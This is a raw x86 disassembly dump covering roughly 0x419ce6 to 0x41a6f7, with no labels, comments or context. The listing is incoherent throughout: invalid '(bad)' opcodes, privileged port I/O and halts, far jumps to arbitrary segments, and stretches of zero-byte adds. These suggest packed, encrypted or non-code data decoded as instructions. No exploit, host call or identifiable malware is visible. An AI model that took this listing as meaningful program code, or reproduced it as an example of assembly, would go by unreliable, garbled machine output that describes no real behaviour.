  419ce6:	adc    DWORD PTR ds:0xf0c6e0f0,0x90d8e46d
  419cf0:	pop    edi
  419cf1:	sbb    al,0x2c
  419cf3:	jb     0x419d03
  419cf5:	sti    
  419cf6:	xor    bl,0x86
  419cf9:	out    0x35,eax
  419cfb:	add    edx,0xffffffd8
  419cfe:	retf   
  419cff:	pop    ds
  419d00:	xchg   DWORD PTR [eax+0x78],ebp
  419d03:	jo     0x419cac
  419d05:	out    0xd9,eax
  419d07:	neg    al
  419d09:	stos   BYTE PTR es:[edi],al
  419d0a:	mov    dl,0x7b
  419d0c:	push   ds
  419d0d:	xor    al,0x97
  419d0f:	sub    eax,0xcbf2c851
  419d14:	ins    BYTE PTR es:[edi],dx
  419d15:	je     0x419cf3
  419d17:	pushf  
  419d18:	mov    ebp,0x49636bd8
  419d1d:	jns    0x419cbe
  419d1f:	repz jnp 0x419d4f
  419d22:	lods   eax,DWORD PTR ds:[esi]
  419d23:	aad    0xc3
  419d25:	lods   al,BYTE PTR ds:[esi]
  419d26:	arpl   WORD PTR gs:[edx-0x737ffd50],bp
  419d2d:	in     al,0xa0
  419d2f:	cmp    DWORD PTR [eax+edx*8+0x1d],0x60
  419d34:	(bad)  
  419d35:	jp     0x419d5e
  419d37:	iret   
  419d38:	mov    edi,DWORD PTR [ebx+eax*2-0x714717d0]
  419d3f:	mov    dl,0x97
  419d41:	inc    edx
  419d42:	jge    0x419d24
  419d44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d45:	std    
  419d46:	sbb    ebx,DWORD PTR [esi]
  419d48:	popf   
  419d49:	imul   esp,DWORD PTR [eax-0x37],0x4da5087b
  419d50:	into   
  419d51:	dec    esi
  419d52:	and    bl,BYTE PTR [edx-0xb]
  419d55:	jmp    0xc3345b92
  419d5a:	cli    
  419d5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d5c:	repnz test al,0x65
  419d5f:	inc    edx
  419d60:	mov    eax,0x94f1eed5
  419d65:	adc    eax,0xf0dc30f5
  419d6a:	jno    0x419d10
  419d6c:	jp     0x419dce
	...
  419dd6:	lock xchg edi,eax
  419dd8:	std    
  419dd9:	cmp    al,0xff
  419ddb:	jle    0x419dce
  419ddd:	fistp  QWORD PTR [edi-0x16]
  419de0:	ss (bad) 
  419de3:	cmp    al,0x2
  419de5:	or     BYTE PTR [edi+0x16],ah
  419de8:	add    DWORD PTR [eax],eax
  419dea:	add    BYTE PTR [ecx],al
  419dec:	add    BYTE PTR [eax],al
  419dee:	inc    eax
  419def:	sbb    al,0x54
  419df1:	sti    
  419df2:	or     eax,0xa8832f20
  419df7:	(bad)  
  419df8:	xchg   esi,eax
  419df9:	sahf   
  419dfa:	repnz mov edi,0xea7e2b3
  419e00:	mov    ds:0x15770dea,al
  419e05:	xchg   ebx,eax
  419e06:	and    ecx,DWORD PTR [edi-0x90bd43a]
  419e0c:	mov    al,0x2a
  419e0e:	in     eax,dx
  419e0f:	jmp    0x8999:0x2da4f414
  419e16:	mov    cl,ch
  419e18:	inc    ebp
  419e19:	call   0x35a4:0x6e7778ab
  419e20:	xlat   BYTE PTR ds:[ebx]
  419e21:	mov    dl,0xf2
  419e23:	add    eax,esi
  419e25:	or     al,0x6b
  419e27:	je     0x419e36
  419e29:	fisubr DWORD PTR [esp+esi*8+0x1a]
  419e2d:	xor    BYTE PTR [edx+0x3f],al
  419e30:	leave  
  419e31:	inc    ebp
  419e32:	inc    ebp
  419e33:	sub    al,0x90
  419e35:	xchg   ecx,eax
  419e36:	daa    
  419e37:	mov    BYTE PTR [ebp-0x22],ch
  419e3a:	xchg   ebx,eax
  419e3b:	xchg   ebx,eax
  419e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e3d:	add    ebx,DWORD PTR [edx]
  419e3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e40:	jg     0x419e7d
  419e42:	ror    BYTE PTR [eax-0x52ecf36c],0x86
  419e49:	out    dx,al
  419e4a:	hlt    
  419e4b:	aas    
  419e4c:	mov    ?,WORD PTR [eax-0x64]
  419e4f:	xchg   esi,eax
  419e50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e51:	mov    cl,0x4d
  419e53:	xchg   ebp,eax
  419e54:	(bad)  
  419e55:	fwait
  419e56:	push   ss
  419e57:	mov    bh,0x81
  419e59:	rol    BYTE PTR [ebx+ebp*4+0x4fa47927],1
  419e60:	mov    esp,0x633446ee
  419e65:	cwde   
  419e66:	outs   dx,DWORD PTR ds:[esi]
  419e67:	test   eax,0x14104918
  419e6c:	xchg   ebp,eax
  419e6d:	mov    dh,0x94
  419e6f:	xor    al,0xb4
  419e71:	push   ebp
  419e72:	jne    0x419e6c
  419e74:	sbb    eax,0xef12aad5
  419e79:	sti    
  419e7a:	mov    eax,ds:0xf6d0a01e
  419e7f:	enter  0x4a4c,0x48
  419e83:	out    dx,eax
  419e84:	out    0x8b,al
  419e86:	jecxz  0x419ee1
  419e88:	dec    edx
  419e89:	inc    ebp
  419e8a:	ret    
  419e8b:	jmp    0x419ec1
  419e8d:	mov    DWORD PTR [edi+0x14b9dc1e],edi
  419e93:	lods   eax,DWORD PTR ds:[esi]
  419e94:	popf   
  419e95:	test   DWORD PTR [eax-0x3cac2a80],esp
  419e9b:	push   ebx
  419e9c:	jmp    0x8412:0x3e159ae0
  419ea3:	out    0x79,eax
  419ea5:	xor    bl,BYTE PTR [ebx-0x79]
  419ea8:	arpl   di,cx
  419eaa:	push   edx
  419eab:	xchg   ecx,eax
  419eac:	mov    esp,0x6c8b510b
  419eb1:	jmp    0xd3ac:0x460afefa
  419eb8:	shr    DWORD PTR [esi-0x7dbf3970],0x25
  419ebf:	sub    BYTE PTR [ebx+esi*2],0x18
  419ec3:	push   cs
  419ec4:	mov    dl,0xe1
  419ec6:	dec    ebp
  419ec7:	push   cs
  419ec8:	inc    eax
  419ec9:	imul   esi,DWORD PTR [ebx],0x4a8c3662
  419ecf:	xchg   edi,eax
  419ed0:	or     al,0xd3
  419ed2:	mov    dx,0x74dd
  419ed6:	leave  
  419ed7:	fwait
  419ed8:	jmp    FWORD PTR [esi+0x6e3ff493]
  419ede:	or     al,0x4e
  419ee0:	es xor al,0x91
  419ee3:	xor    eax,0xa08d8ce0
  419ee8:	mov    esi,0x7b7102aa
  419eed:	and    al,0x0
	...
  419f53:	add    BYTE PTR [eax],al
  419f55:	add    BYTE PTR [edi+0x5fc517d8],al
  419f5b:	iret   
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419f61:	inc    esi
  419f62:	xchg   edi,eax
  419f63:	cli    
  419f64:	ins    DWORD PTR es:[edi],dx
  419f65:	jge    0x419fce
  419f67:	pop    ss
  419f68:	add    DWORD PTR [eax],eax
  419f6a:	add    BYTE PTR [ecx],al
  419f6c:	add    BYTE PTR [eax],al
  419f6e:	mov    bh,0x87
  419f70:	leave  
  419f71:	std    
  419f72:	xor    edi,ebp
  419f74:	cmp    DWORD PTR [edx],ebx
  419f76:	icebp  
  419f77:	out    dx,eax
  419f78:	push   0xc05ed68f
  419f7d:	hlt    
  419f7e:	xchg   DWORD PTR [ecx],edx
  419f80:	mov    ch,0xee
  419f82:	(bad)  
  419f83:	std    
  419f84:	dec    esp
  419f85:	pop    eax
  419f86:	mov    ds:0xfb710ef3,al
  419f8b:	shl    edx,0x70
  419f8e:	sub    al,0x9f
  419f90:	pop    ebx
  419f91:	mov    BYTE PTR [edi],dh
  419f93:	mov    ds:0xd935b486,eax
  419f98:	jmp    0x93fa:0xf986e918
  419f9f:	pop    es
  419fa0:	cli    
  419fa1:	jmp    DWORD PTR [ecx]
  419fa3:	mov    esi,0x3c517969
  419fa8:	ins    BYTE PTR es:[edi],dx
  419fa9:	cwde   
  419faa:	mov    ah,0xe1
  419fac:	dec    ebx
  419fad:	scas   al,BYTE PTR es:[edi]
  419fae:	call   0x3f467e46
  419fb3:	jmp    0x41a00e
  419fb5:	mov    ds:0x7dcc963e,al
  419fba:	jge    0x41a02b
  419fbc:	mov    esp,0x167c511b
  419fc1:	sub    edi,esp
  419fc3:	adc    ebp,edx
  419fc5:	or     edx,edi
  419fc7:	rol    ch,0xeb
  419fca:	je     0x419fa0
  419fcc:	mov    ds:0xc2b1e49,eax
  419fd1:	mov    ss,WORD PTR [eax-0x71]
  419fd4:	ret    0x1967
  419fd7:	push   fs
  419fd9:	add    DWORD PTR [ebx-0x2413bcc9],edx
  419fdf:	add    BYTE PTR [eax-0x618449a2],0xc9
  419fe6:	ror    BYTE PTR [edi+0x139db51c],0x84
  419fed:	xlat   BYTE PTR ds:[ebx]
  419fee:	jno    0x419fc1
  419ff0:	rdtsc  
  419ff2:	rcl    eax,cl
  419ff4:	mov    WORD PTR [eax],es
  419ff6:	jmp    0x419fff
  419ff8:	ins    BYTE PTR es:[edi],dx
  419ff9:	pusha  
  419ffa:	clc    
  419ffb:	shr    BYTE PTR [edx-0xa],1
  419ffe:	jg     0x419f9c
  41a000:	cmp    DWORD PTR [eax],edx
  41a002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a003:	(bad)  [edi+0x27c0cb4d]
  41a009:	push   edi
  41a00a:	and    eax,DWORD PTR [ebp+edi*2-0x32]
  41a00e:	fisubr DWORD PTR [eax]
  41a010:	ficom  DWORD PTR [edi-0x7b]
  41a013:	sub    bh,BYTE PTR [ecx]
  41a015:	popf   
  41a016:	mov    esi,DWORD PTR [ebp+0x3f]
  41a019:	loope  0x41a03b
  41a01b:	pop    ecx
  41a01c:	dec    ebp
  41a01d:	not    BYTE PTR [edi]
  41a01f:	in     eax,0xa
  41a021:	or     DWORD PTR [esi+0x32],esp
  41a024:	jnp    0x41a053
  41a026:	arpl   WORD PTR [ecx],cx
  41a028:	daa    
  41a029:	lods   al,BYTE PTR ds:[esi]
  41a02a:	mov    ds:0xbf982caf,eax
  41a02f:	sbb    ecx,edi
  41a031:	pop    eax
  41a032:	std    
  41a033:	stos   DWORD PTR es:[edi],eax
  41a034:	(bad)  
  41a036:	add    cl,BYTE PTR [edi+0x46]
  41a039:	les    edi,FWORD PTR [edx-0x247ca3b4]
  41a03f:	fcom   QWORD PTR [ebx-0x9]
  41a042:	mov    DWORD PTR [ecx+0x1b],edi
  41a045:	mov    cl,0x3b
  41a047:	inc    ebp
  41a048:	ficomp WORD PTR [edi]
  41a04a:	and    al,0xa
  41a04c:	jae    0x419fe6
  41a04e:	inc    eax
  41a04f:	sub    DWORD PTR [edx-0x5a7d82ad],edx
  41a055:	mov    DWORD PTR [edx+eax*2-0x27],eax
  41a059:	sub    BYTE PTR [ebx-0x56],ah
  41a05c:	mov    ah,0xe0
  41a05e:	leave  
  41a05f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a060:	cmc    
  41a061:	lock retf 0xde52
  41a065:	icebp  
  41a066:	inc    ebx
  41a067:	out    0x8,eax
  41a069:	inc    edi
  41a06a:	(bad)  [edi]
  41a06c:	fadd   DWORD PTR fs:[eax]
	...
  41a0d3:	add    BYTE PTR [eax],al
  41a0d5:	add    BYTE PTR [esi-0x15],cl
  41a0d8:	sub    cl,BYTE PTR [esi-0x51]
  41a0db:	iret   
  41a0dc:	outs   dx,BYTE PTR ds:[esi]
  41a0dd:	jmp    0x41a062
  41a0df:	push   edx
  41a0e0:	test   BYTE PTR [eax+0x2d],bh
  41a0e3:	popf   
  41a0e4:	outs   dx,DWORD PTR ds:[esi]
  41a0e5:	xchg   DWORD PTR [edi+0x18],esp
  41a0e8:	add    DWORD PTR [eax],eax
  41a0ea:	add    BYTE PTR [ecx],al
  41a0ec:	add    BYTE PTR [eax],al
  41a0ee:	cmp    esi,DWORD PTR [ebx]
  41a0f0:	test   DWORD PTR [ebx+0x71],esi
  41a0f3:	scas   al,BYTE PTR es:[edi]
  41a0f4:	(bad)  
  41a0f6:	mov    WORD PTR [eax+esi*8+0x3ee98295],fs
  41a0fd:	in     al,0x97
  41a0ff:	aad    0xd3
  41a101:	push   esi
  41a102:	push   es
  41a103:	pop    ds
  41a104:	xor    DWORD PTR [edi+0x425faa1a],ebx
  41a10a:	and    DWORD PTR [eax+0x3f8f07ce],0x6d643b0f
  41a114:	cmp    BYTE PTR ds:0x94c8b6c5,cl
  41a11a:	scas   al,BYTE PTR es:[edi]
  41a11b:	pop    ss
  41a11c:	in     al,0xd5
  41a11e:	arpl   WORD PTR [esi-0xe],bp
  41a121:	or     eax,0xa6b69493
  41a126:	adc    al,0x3a
  41a128:	mov    gs,esi
  41a12a:	push   ss
  41a12b:	fsubr  st,st(5)
  41a12d:	enter  0x2e73,0xf
  41a131:	dec    ebp
  41a132:	popf   
  41a133:	in     eax,0xa5
  41a135:	adc    eax,0x86e1289a
  41a13a:	ins    BYTE PTR es:[edi],dx
  41a13b:	aaa    
  41a13c:	xchg   esi,eax
  41a13d:	xor    dl,BYTE PTR [ebx+0x678c681a]
  41a143:	sbb    dl,BYTE PTR [ecx-0x4dd6638b]
  41a149:	adc    eax,0x97edf1ee
  41a14e:	xor    al,0x6f
  41a150:	mov    bh,BYTE PTR [edx-0x521c6602]
  41a156:	pop    ebx
  41a157:	je     0x41a112
  41a159:	std    
  41a15a:	adc    BYTE PTR [esi+ecx*1+0x43],bh
  41a15e:	icebp  
  41a15f:	mov    eax,0x572101ed
  41a164:	adc    eax,0xe65bc7c7
  41a169:	push   edi
  41a16a:	adc    eax,0x9610dbb0
  41a16f:	mov    bl,dh
  41a171:	or     eax,0xc40ca1c4
  41a176:	pop    esp
  41a177:	jle    0x41a12d
  41a179:	lea    edi,[edx-0x49f143ca]
  41a17f:	pop    ss
  41a180:	push   ebp
  41a181:	out    dx,al
  41a182:	pop    eax
  41a183:	sub    BYTE PTR [edx-0x68],cl
  41a186:	sub    al,0x52
  41a188:	push   edi
  41a189:	lahf   
  41a18a:	ins    DWORD PTR es:[edi],dx
  41a18b:	daa    
  41a18c:	jle    0x41a1ce
  41a18e:	lea    edx,[eax-0x1063a404]
  41a194:	loope  0x41a128
  41a196:	sub    ebx,DWORD PTR [esi+edx*2]
  41a199:	enter  0x99d,0x83
  41a19d:	dec    ebx
  41a19e:	cmp    BYTE PTR [edx],bl
  41a1a0:	ja     0x41a173
  41a1a2:	lock (bad) 
  41a1a4:	mov    al,0x46
  41a1a6:	(bad)  
  41a1a7:	jecxz  0x41a14a
  41a1a9:	lock jecxz 0x41a131
  41a1ac:	mov    ds:0x4a0f7dad,al
  41a1b1:	mov    gs,WORD PTR [esi]
  41a1b3:	push   0xffffffe7
  41a1b5:	add    eax,DWORD PTR [edi-0x2f]
  41a1b8:	ret    0xa7fc
  41a1bb:	push   0xa3105ee6
  41a1c0:	pop    esp
  41a1c1:	ins    BYTE PTR es:[edi],dx
  41a1c2:	div    edx
  41a1c4:	stos   DWORD PTR es:[edi],eax
  41a1c5:	adc    eax,0xc472ae75
  41a1ca:	scas   al,BYTE PTR es:[edi]
  41a1cb:	mov    edx,0x7c3ac232
  41a1d0:	xor    ebx,eax
  41a1d2:	mov    bl,0x14
  41a1d4:	std    
  41a1d5:	xor    ebx,DWORD PTR [ecx+0x1e]
  41a1d8:	adc    ecx,DWORD PTR [edx-0x65]
  41a1db:	bound  ebx,QWORD PTR [ebx-0x5a452b72]
  41a1e1:	clc    
  41a1e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1e3:	in     eax,dx
  41a1e4:	test   DWORD PTR [edi],edx
  41a1e6:	mov    DWORD PTR [edx+0x19],edx
  41a1e9:	xchg   edi,eax
  41a1ea:	sub    edi,DWORD PTR [edx+0x3c]
  41a1ed:	out    dx,al
	...
  41a256:	sbb    al,0xc
  41a258:	std    
  41a259:	sbb    ebp,edi
  41a25b:	stc    
  41a25c:	cld    
  41a25d:	or     eax,0x398d6850
  41a262:	xchg   esp,eax
  41a263:	shl    DWORD PTR [esi],0xb7
  41a266:	sbb    DWORD PTR [bx+di],eax
  41a269:	add    BYTE PTR [eax],al
  41a26b:	add    DWORD PTR [eax],eax
  41a26d:	add    BYTE PTR [esi+edx*2+0x6c],ah
  41a271:	jle    0x41a2a8
  41a273:	mov    BYTE PTR [eax],ch
  41a275:	nop
  41a276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a277:	adc    bl,BYTE PTR [edi+0x7f]
  41a27a:	sahf   
  41a27b:	mov    ds:0x71f76861,eax
  41a280:	cmp    dl,BYTE PTR [edi+0x2a]
  41a283:	jno    0x41a2fe
  41a285:	cmp    al,0xdb
  41a287:	sub    eax,0x80662d55
  41a28c:	aam    0x9e
  41a28e:	jl     0x41a261
  41a290:	xlat   BYTE PTR ds:[ebx]
  41a291:	xchg   ebx,eax
  41a292:	cmp    al,0x78
  41a294:	pop    ebx
  41a295:	mov    ah,0x68
  41a297:	imul   ecx,DWORD PTR [ecx-0x26e20d15],0xffffffb9
  41a29e:	xlat   BYTE PTR ds:[ebx]
  41a29f:	pop    esp
  41a2a0:	test   DWORD PTR [edi-0x4a20a69],edx
  41a2a6:	xlat   BYTE PTR ds:[ebx]
  41a2a7:	pop    esi
  41a2a8:	fwait
  41a2a9:	cmp    dh,bh
  41a2ab:	jno    0x41a24d
  41a2ad:	add    BYTE PTR [ecx+edi*4-0x6e],ch
  41a2b1:	and    DWORD PTR [ebx+0x15],0x43609fa2
  41a2b8:	mov    ah,0x73
  41a2ba:	pop    esp
  41a2bb:	ret    0x274c
  41a2be:	mov    ch,0xe7
  41a2c0:	and    ebp,edx
  41a2c2:	jnp    0x41a2b9
  41a2c4:	jae    0x41a2b9
  41a2c6:	xor    DWORD PTR [eax-0x46],edx
  41a2c9:	call   0xef78:0xa412f590
  41a2d0:	sti    
  41a2d1:	mov    esp,0x5c6d2d91
  41a2d6:	outs   dx,BYTE PTR ds:[esi]
  41a2d7:	push   edx
  41a2d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2d9:	jp     0x41a33f
  41a2db:	push   ebx
  41a2dc:	jo     0x41a280
  41a2de:	mov    al,0xed
  41a2e0:	cmp    ebx,edx
  41a2e2:	mov    esi,0x5c049eb9
  41a2e7:	mov    ebp,0xbb7a57ac
  41a2ec:	and    ah,0x6d
  41a2ef:	fadd   st,st(4)
  41a2f1:	cli    
  41a2f2:	add    BYTE PTR [edi],dl
  41a2f4:	adc    DWORD PTR [edx-0x58],esi
  41a2f7:	leave  
  41a2f8:	fsub   st(2),st
  41a2fa:	sbb    ch,dh
  41a2fc:	inc    ebp
  41a2fd:	out    dx,eax
  41a2fe:	or     al,0xd3
  41a300:	mov    bh,BYTE PTR [eax-0x1cf4312c]
  41a306:	xor    eax,0xfb1836a7
  41a30b:	int    0x86
  41a30d:	ins    BYTE PTR es:[edi],dx
  41a30e:	push   eax
  41a30f:	xchg   edx,eax
  41a310:	ja     0x41a2b7
  41a312:	sub    eax,0x3d3ff87e
  41a317:	(bad)  
  41a318:	ror    BYTE PTR [edx+0x7a],1
  41a31b:	push   0x53
  41a31d:	push   0xb4a21d54
  41a322:	xor    bh,ch
  41a324:	and    DWORD PTR [esi],ecx
  41a326:	xlat   BYTE PTR ds:[ebx]
  41a327:	dec    ebp
  41a328:	mov    al,0x62
  41a32a:	xor    BYTE PTR [edi-0x31b75c2],dl
  41a330:	cmp    ebp,ebx
  41a332:	leave  
  41a333:	dec    esp
  41a334:	(bad)  
  41a335:	stos   BYTE PTR es:[edi],al
  41a336:	mov    al,0x61
  41a338:	enter  0xef88,0x49
  41a33c:	ds inc ecx
  41a33e:	push   cs
  41a33f:	(bad)  
  41a340:	xor    dl,BYTE PTR [esi]
  41a342:	pop    esi
  41a343:	add    cl,bl
  41a345:	mov    eax,ds:0xa7a90add
  41a34a:	sub    eax,0xc47f538c
  41a34f:	test   eax,0x63445ced
  41a354:	dec    eax
  41a355:	shl    BYTE PTR [ebx+0x4c],1
  41a358:	mov    eax,0x7a1537a6
  41a35d:	cmp    al,0xda
  41a35f:	xchg   ebp,eax
  41a360:	and    al,0x6a
  41a362:	stos   BYTE PTR es:[edi],al
  41a363:	and    eax,0x7d4dd5b1
  41a368:	fldenv [esi]
  41a36a:	cld    
  41a36b:	or     ebx,ebx
  41a36d:	adc    eax,DWORD PTR [eax]
	...
  41a3d3:	add    BYTE PTR [eax],al
  41a3d5:	add    bh,dh
  41a3d7:	pop    eax
  41a3d8:	test   al,0x13
  41a3da:	scas   eax,DWORD PTR es:[edi]
  41a3db:	repz (bad) 
  41a3dd:	cld    
  41a3de:	adc    eax,0x45a6955c
  41a3e3:	sbb    ch,BYTE PTR [edx+0x11a6713]
  41a3e9:	add    BYTE PTR [eax],al
  41a3eb:	add    DWORD PTR [eax],eax
  41a3ed:	add    BYTE PTR [esi+0x26],bh
  41a3f0:	mov    eax,0xf01799fe
  41a3f5:	out    0x2d,al
  41a3f7:	sbb    eax,0xa8ff75e8
  41a3fc:	cmp    BYTE PTR [ecx+0x2f7fb970],bh
  41a402:	cmp    DWORD PTR [edi-0x69bba660],eax
  41a408:	pop    edi
  41a409:	or     DWORD PTR [ebx+0x1b],ebx
  41a40c:	mov    edx,0x4bf91dd4
  41a411:	jne    0x41a46a
  41a413:	out    0xe9,al
  41a415:	sti    
  41a416:	sbb    esi,edx
  41a418:	mov    dl,0x4a
  41a41a:	push   edx
  41a41b:	xor    ebp,edx
  41a41d:	push   edx
  41a41e:	or     al,0x16
  41a420:	or     DWORD PTR [ebx-0x70],edx
  41a423:	cmp    BYTE PTR [eax+ecx*8+0x7dda9a7b],ch
  41a42a:	je     0x41a3af
  41a42c:	xchg   esi,eax
  41a42d:	cmp    esi,DWORD PTR [edi]
  41a42f:	scas   eax,DWORD PTR es:[edi]
  41a430:	lds    ebx,FWORD PTR [ecx-0x26cd3714]
  41a436:	in     eax,0xf4
  41a438:	mov    bh,0x35
  41a43a:	or     DWORD PTR [ebx+0x34],edi
  41a43d:	test   DWORD PTR [ebp-0x34],eax
  41a440:	test   BYTE PTR [ecx+0x35],bl
  41a443:	push   edi
  41a444:	push   ds
  41a445:	jo     0x41a4a5
  41a447:	test   eax,edi
  41a449:	xchg   BYTE PTR [ebp-0x41],dh
  41a44c:	pop    ds
  41a44d:	sbb    esi,eax
  41a44f:	jb     0x41a4ad
  41a451:	test   eax,0x924b51a5
  41a456:	ret    0x5c74
  41a459:	pop    edx
  41a45a:	sbb    BYTE PTR [ebp-0x6f],ch
  41a45d:	jmp    0x41a4b2
  41a45f:	aad    0x11
  41a461:	add    al,0x15
  41a463:	out    0xec,eax
  41a465:	pop    ebx
  41a466:	adc    ah,BYTE PTR [esi]
  41a468:	lds    edi,FWORD PTR [esi+edx*1-0x7aff3beb]
  41a46f:	iret   
  41a470:	push   ds
  41a471:	mov    ebx,0x7c15918c
  41a476:	std    
  41a477:	push   ss
  41a478:	sar    BYTE PTR [esi],cl
  41a47a:	and    eax,0xa075f47f
  41a47f:	pop    ebp
  41a480:	mov    ebx,0xa4c9a1c9
  41a485:	cwde   
  41a486:	jnp    0x41a507
  41a488:	loop   0x41a495
  41a48a:	or     al,BYTE PTR [ebx+ebp*4-0x4d]
  41a48e:	lds    ebp,FWORD PTR [esi+0x8]
  41a491:	cmp    DWORD PTR [ecx+ecx*2+0x10],esi
  41a495:	pusha  
  41a496:	and    bh,BYTE PTR [eax+0x38]
  41a499:	jmp    0xa5f:0xac4c813e
  41a4a0:	sbb    al,0x6a
  41a4a2:	repz dec esi
  41a4a4:	test   eax,0x51e45c3
  41a4a9:	rol    DWORD PTR [edx-0x66c6ad29],1
  41a4af:	aam    0x50
  41a4b1:	sbb    al,0x17
  41a4b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4b4:	shl    eax,0x5
  41a4b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4b8:	mov    eax,ds:0x5c60244c
  41a4bd:	dec    esp
  41a4be:	lods   eax,DWORD PTR ds:[esi]
  41a4bf:	ins    BYTE PTR es:[edi],dx
  41a4c0:	pop    edx
  41a4c1:	or     BYTE PTR [edx+edi*2-0x2561fc06],bl
  41a4c8:	aas    
  41a4c9:	adc    cl,BYTE PTR [ebx+0x29]
  41a4cc:	pop    ebp
  41a4cd:	xor    al,BYTE PTR [edx-0x79f9ad2a]
  41a4d3:	push   edx
  41a4d4:	imul   esi,ebp,0xf2c7c6b0
  41a4da:	lds    ebp,FWORD PTR [edx]
  41a4dc:	mov    dh,0x4c
  41a4de:	jge    0x41a48d
  41a4e0:	cdq    
  41a4e1:	lods   eax,DWORD PTR ds:[esi]
  41a4e2:	sbb    BYTE PTR [eax+0x681ef3ca],dh
  41a4e8:	aaa    
  41a4e9:	shl    BYTE PTR [esi+0x1b5ab8],0x0
	...
  41a554:	add    BYTE PTR [eax],al
  41a556:	mov    edi,0xff0fcf82
  41a55b:	dec    edi
  41a55c:	push   DWORD PTR [edx+0x5f4d0d09]
  41a562:	jmp    0x11b:0x67c2a6f5
  41a569:	add    BYTE PTR [eax],al
  41a56b:	add    DWORD PTR [eax],eax
  41a56d:	add    BYTE PTR [esi-0x7c4bf4e9],ah
  41a573:	pop    ecx
  41a574:	neg    BYTE PTR [esi-0x57]
  41a577:	test   ah,ah
  41a579:	xchg   ebx,eax
  41a57a:	or     edx,DWORD PTR [edi]
  41a57c:	jmp    0x4a9f1b
  41a581:	sbb    ebp,DWORD PTR [ebx+0x7970ff4f]
  41a587:	xchg   esp,eax
  41a588:	jnp    0x41a592
  41a58a:	popf   
  41a58b:	mov    ecx,0x3b8a85ce
  41a590:	jmp    0x1133:0xa5495fb6
  41a597:	xchg   edx,eax
  41a598:	ins    BYTE PTR es:[edi],dx
  41a599:	mov    cl,0x70
  41a59b:	sub    ebx,esi
  41a59d:	hlt    
  41a59e:	sbb    BYTE PTR [esi+eiz*2-0x7b4375c7],dh
  41a5a5:	or     eax,0x32292f06
  41a5aa:	clc    
  41a5ab:	outs   dx,DWORD PTR ds:[esi]
  41a5ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5ad:	jno    0x41a570
  41a5af:	sti    
  41a5b0:	ffree  st(4)
  41a5b2:	(bad)  
  41a5b3:	push   edi
  41a5b4:	mov    esi,fs
  41a5b6:	xchg   DWORD PTR [ecx+0x7b],ebx
  41a5b9:	mov    dl,0xf8
  41a5bb:	cmc    
  41a5bc:	adc    ecx,DWORD PTR [ebp+0x1feb15]
  41a5c2:	xor    ah,BYTE PTR ds:0x62cbe2c8
  41a5c8:	scas   al,BYTE PTR es:[edi]
  41a5c9:	mov    eax,0x59e0e18a
  41a5ce:	cmp    edx,edi
  41a5d0:	mov    bl,0x68
  41a5d2:	data16 mov ds:0x407c8c77,al
  41a5d8:	imul   esi,DWORD PTR [edx-0x52],0xffffffbb
  41a5dc:	push   esp
  41a5dd:	mov    bl,0x22
  41a5df:	jnp    0x41a5b8
  41a5e1:	retf   0x2ca8
  41a5e4:	jmp    0xe465aab2
  41a5e9:	or     ecx,ebp
  41a5eb:	and    BYTE PTR [ebp-0x3d],dh
  41a5ee:	lods   al,BYTE PTR ds:[esi]
  41a5ef:	xor    ecx,esp
  41a5f1:	lea    edi,[ebx-0x17e6175]
  41a5f7:	sar    bl,cl
  41a5f9:	or     eax,ebx
  41a5fb:	inc    edi
  41a5fc:	mov    dl,0x6f
  41a5fe:	lock pop esp
  41a600:	fldcw  WORD PTR [eax-0xe]
  41a603:	cmp    eax,0xdef7f1e3
  41a608:	xchg   ebx,eax
  41a609:	outs   dx,DWORD PTR ds:[esi]
  41a60a:	hlt    
  41a60b:	sbb    al,0xd
  41a60d:	repz hlt 
  41a60f:	pop    es
  41a610:	test   al,0xd8
  41a612:	sbb    al,0x45
  41a614:	fs xchg edx,eax
  41a616:	adc    DWORD PTR [ebx+0x10],eax
  41a619:	pop    edi
  41a61a:	xlat   BYTE PTR ds:[ebx]
  41a61b:	or     BYTE PTR [ebx+0x46],al
  41a61e:	mov    ch,0x49
  41a620:	cdq    
  41a621:	jmp    0x41a697
  41a623:	mov    esi,0x16462fa1
  41a628:	outs   dx,WORD PTR ds:[esi]
  41a62a:	xor    DWORD PTR [eax],ebp
  41a62c:	lea    ebp,[edi+0x53]
  41a62f:	ja     0x41a5b6
  41a631:	(bad)  
  41a632:	jae    0x41a62b
  41a634:	mov    ebp,0xc33260d5
  41a639:	stos   DWORD PTR es:[edi],eax
  41a63a:	inc    edx
  41a63b:	es ss mov ?,esi
  41a63f:	xchg   ebp,eax
  41a640:	mov    ebp,0x3b770a0c
  41a645:	and    eax,0xb1e09e6b
  41a64a:	call   0x85f5:0xeb66f47
  41a651:	scas   eax,DWORD PTR es:[edi]
  41a652:	jmp    0x2ba3:0x1d7bafa5
  41a659:	xchg   edx,eax
  41a65a:	invd   
  41a65c:	jbe    0x41a666
  41a65e:	test   DWORD PTR [ebp-0x6b],esi
  41a661:	mov    esi,0x3f9d9396
  41a666:	iret   
  41a667:	data16 mov bl,0x47
  41a66a:	mov    ecx,0x20641f
	...
  41a6d3:	add    BYTE PTR [eax],al
  41a6d5:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a6d9:	inc    ecx
  41a6da:	ja     0x41a747
  41a6dc:	pop    esp
  41a6dd:	aas    
  41a6de:	dec    ecx
  41a6df:	push   0x6e41a625
  41a6e4:	repz inc edx
  41a6e6:	addr16 sbb al,0x1
  41a6e9:	add    BYTE PTR [eax],al
  41a6eb:	add    DWORD PTR [eax],eax
  41a6ed:	add    BYTE PTR [ebp-0x2e1f7696],bl
  41a6f3:	push   edx
  41a6f4:	push   ebp
  41a6f5:	sbb    al,0xae
  41a6f7:	xchg   DWORD PTR [eax-0x4c],ebx
